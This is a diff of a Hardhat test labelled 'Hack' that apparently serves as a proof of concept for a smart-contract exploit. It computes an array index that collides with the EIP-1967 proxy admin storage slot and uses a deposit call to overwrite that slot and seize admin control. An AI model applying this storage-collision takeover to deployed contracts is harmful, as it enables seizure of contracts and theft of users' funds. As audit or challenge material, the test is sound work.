@@ -31,23 +31,29 @@ async function setup() {
   }
 }
 
+const adminSlot = BigNumber.from('0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103')
+const implementationSlot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
+
+const hashOfZeroSlot = BigNumber.from('0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563')
+
+const arrayIndexToCheck = adminSlot.sub(hashOfZeroSlot)
+console.log(arrayIndexToCheck);
+
+const arrayIndex = '0x8c233a8ef5cb28000000000000000000000000000000000000000000000000'
+
 describe('Example unit test', () => {
   const token = BigNumber.from(10).pow(18)
   describe('Constructor', () => {
     it('Hack', async () => {
       const { buckets, proxy, attack, deployer, backend, feeAddress, users } = await setup()
       let bucketsContract = Buckets__factory.connect(proxy.address, await ethers.getSigner(users[0].address))
-      console.log(BNToNumstr(await bucketsContract.totalSupply(), 18, 3))
-      // await users[0].proxy.changeAdmin()
-      // await users[0].proxy.setFailsafeAdmin(BigNumber.from("0000000000000000000000000xf22a4bf45bbfde23c9ebf64357dfde96a5aefad4"))
-      // await users[0].proxy.changeAdmin()
-      console.log(await ethers.provider.getStorageAt(proxy.address, "0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103"));
-      
-      await users[0].proxy.setFailsafeAdmin(BigNumber.from(ethers.utils.hexValue("0x000000000000000000000000f22a4bf45bbfde23c9ebf64357dfde96a5aefad4")))
-      await users[0].proxy.changeAdmin()
-      // await users[0].proxy.upgradeTo(attack.address)
-      // bucketsContract = Buckets__factory.connect(attack.address, ethers.provider)
-      // console.log(BNToNumstr(await bucketsContract.totalSupply(), 18, 3))
+      console.log(await ethers.provider.getStorageAt(bucketsContract.address, adminSlot));
+      // console.log(await ethers.provider.getStorageAt(proxy.address, adminSlot));
+      await users[0].proxy.setFailsafeAdmin(ethers.constants.MaxUint256)
+      await bucketsContract.deposit(arrayIndexToCheck, {value: 5})
+      console.log(await ethers.provider.getStorageAt(bucketsContract.address, adminSlot));
+      // await bucketsContract.deposit(1, {value: 5})
+      // console.log(await ethers.provider.getStorageAt(proxy.address, adminSlot));
     })
   })
 })
